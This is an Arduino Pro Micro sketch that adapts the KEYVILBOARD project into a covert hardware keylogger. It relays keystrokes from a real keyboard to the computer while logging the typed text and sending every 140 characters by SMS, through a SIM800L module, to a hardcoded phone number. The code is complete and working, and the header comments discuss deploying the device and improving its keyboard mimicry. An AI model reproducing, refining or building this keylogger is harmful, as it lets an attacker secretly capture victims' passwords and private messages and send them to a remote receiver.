// Arduino Pro Micro adaptation of https://github.com/helmmen/KEYVILBOARD (originally for Teensy)
/*
    It works fine but from what I observed it doesn't provide the full range of features of normal keyboard like:
    1. Holding a button results in repetative typing of it on normal keyboard - this project makes it press only once.
    2. Combinations like "shift + enter" or "shift + tab" don't work. Only control+someKey work.
    3. So far there's no way to check whether some button is being hold. 

    Anyway, from what I've seen by looking at the documentation of USB host mini board the "MODE 6" (?) command allows it to receive raw HID data,
    I didn't check it yet because I'd rather use a spare keyboard. Maybe that way it will be able to mimic more features of normal keyboard.
*/

/* SETTINGS */
#define PHONE_RECEIVER_NUMBER "+31XXXXXXXX"
#define CHAR_LIMIT 140 // number of characters before it sends sms
#define DELAY_BEFORE_RELEASING_KEYS 5 // milliseconds, time between pressing and releasing the button
//#define SERIAL_DEBUG // I'd recommend  to comment it out before deploying the device, use it for testing and observing Serial Monitor only

/*
    Arduino Pro Micro keyboard/mouse functions have a peculiar characteristic...
    If the serial monitor is not opened and nothing is reading serial then any keyboard typing
    or mouse movements are lagging hard. Therefore there's a custom Serial_print function which
    controls whether or not to send debug lines using Serial_print depending on the state
    of SERIAL_DEBUG.
*/

//#define ctrlKey KEY_LEFT_GUI //OSX
#define ctrlKey KEY_LEFT_CTRL //Windows and Linux 
//ctrlKey variation was copied from: https://www.arduino.cc/en/Reference/KeyboardPress

#ifdef SERIAL_DEBUG
#define Serial_begin(x) Serial.begin(x)
#define Serial_print(x) Serial.print(x)
#define Serial_println(x) Serial.println(x)
#else // else define these functions as empty, so they will do nothing if the "#define SERIAL_DEBUG" line is not present above (e.g. if it's commented out)
#define Serial_begin(x)
#define Serial_println(x)
#define Serial_print(x)
#endif

#include "Keyboard.h"
#include <SoftwareSerial.h>
SoftwareSerial KeyboardSerial(15, 14); //communication with USB host board (receiving input from keyboard)
SoftwareSerial SmsSerial(8, 9); //communication with sim800L

struct EscapedKey {
  byte correspondingByte;
  byte pressedKey;
  char* loggedText;
};

EscapedKey escapedKeysData[] = {
  0x49, KEY_PAGE_UP, "[PgUp]",
  0x51, KEY_PAGE_DOWN, "[PgDn]",
  0x47, KEY_HOME, "[Home]",
  0x4F, KEY_END, "[End]",
  0x52, KEY_INSERT, "[Ins]",
  0x53, KEY_DELETE, "[Del]",
  0x3B, KEY_F1, "[F1]",
  0x3C, KEY_F2, "[F2]",
  0x3D, KEY_F3, "[F3]",
  0x3E, KEY_F4, "[F4]",
  0x3F, KEY_F5, "[F5]",
  0x40, KEY_F6, "[F6]",
  0x41, KEY_F7, "[F7]",
  0x42, KEY_F8, "[F8]",
  0x43, KEY_F9, "[F9]",
  0x44, KEY_F10, "[F10]",
  0x57, KEY_F11, "[F11]",
  0x58, KEY_F12, "[F12]",
  0x48, KEY_UP_ARROW, "[Up]",
  0x50, KEY_DOWN_ARROW, "[Down]",
  0x4B, KEY_LEFT_ARROW, "[Left]",
  0x4D, KEY_RIGHT_ARROW, "[Right]",
  0x54, KEY_RIGHT_GUI, "[Print]",
  0x5B, KEY_LEFT_GUI, "[Windows]",
};

char flag_esc = 0;
char TextSms[CHAR_LIMIT];
int char_count;
char sms_cmd[40];

void setup() {
  Serial_begin(9600);
  KeyboardSerial.begin(9600);
  SmsSerial.begin(9600);
  SmsSerial.println("AT+CMGF=1");
  Keyboard.begin();
  Serial_print("ready");
  KeyboardSerial.listen(); // only 1 software serial can be listening at the time, by default the last initialized serial is listening (by using softserial.begin())
}

void loop() {
  if (char_count == CHAR_LIMIT - 1) { // -1 is there because KEY_TAB takes 2 characters to write and if it would be the last pressed key it would write over the range of the array
    Serial_println(TextSms);
    //SmsSerial.write(F("AT+CMGF=1\r\n"));
    delay(200);
    sprintf(sms_cmd, "AT+CMGS=\"%s\"\r\n", PHONE_RECEIVER_NUMBER); // format the sms command (so the number can be easily changed at the top of the code)
    //Serial_println(sms_cmd);
    SmsSerial.write(sms_cmd);
    delay(100);
    SmsSerial.write(TextSms);
    delay(100);
    SmsSerial.write((char)26);
    delay(100);
    Serial_println(F("SMS Sent!"));
    char_count = 0;
  }

  if (KeyboardSerial.available() > 0) {
    byte inByte = KeyboardSerial.read();
    Serial_print(inByte); Serial_print(" - "); Serial_println((char)inByte);

    if (inByte == 27){flag_esc = 1;}
    else {
      if (flag_esc == 1) {
        // Previous char was ESC - Decode all the escaped keys
        bool foundEscapedKey = false;
        for (byte i = 0; i < sizeof(escapedKeysData) / sizeof(EscapedKey); i++) {
          if (inByte == escapedKeysData[i].correspondingByte) {
            Serial_println(escapedKeysData[i].loggedText);
            Keyboard.press(escapedKeysData[i].pressedKey);
            delay(DELAY_BEFORE_RELEASING_KEYS);
            Keyboard.releaseAll();
            foundEscapedKey = true;
            break;
          }
        }
        if (foundEscapedKey == false){Serial_print(F("[?]"));}
        flag_esc = 0;
      }
      else {
        if ((inByte >= 1 && inByte <= 26) && (inByte < 8 || inByte > 10) && inByte != 13) { // for all of the Control+someChar
          Serial_print(F("Control+"));
          Serial_println((char)(inByte + 96)); // 1 for a + 96 gives 97 which is ascii value for it, the same happens for all the other characters from a to z
          Keyboard.press(ctrlKey);
          Keyboard.press((char)(inByte + 96));
          delay(DELAY_BEFORE_RELEASING_KEYS);
          Keyboard.releaseAll();
        }
        else if (inByte == 8) {
          Serial_println(F("Backspace"));
          char_count--; //This is for that backspaced stuff is non important in the array
          Keyboard.press(KEY_BACKSPACE);
          delay(DELAY_BEFORE_RELEASING_KEYS);
          Keyboard.releaseAll();
        }
        else if (inByte == 9) {
          Serial_println(F("^T"));
          TextSms[char_count] = '^';
          char_count++;
          TextSms[char_count] = 'T';
          Keyboard.press(KEY_TAB);
          delay(DELAY_BEFORE_RELEASING_KEYS);
          Keyboard.releaseAll();
        }
        //10 is just left
        else if (inByte == 13) {
          Serial_println(F("Enter"));
          Keyboard.press((char)inByte);
          delay(DELAY_BEFORE_RELEASING_KEYS);
          Keyboard.releaseAll();
        }
        else {
          TextSms[char_count] = (char)inByte;
          char_count++;
          Keyboard.press((char)inByte);
          delay(DELAY_BEFORE_RELEASING_KEYS);
          Keyboard.releaseAll();
        }
      }
    }
  }
}



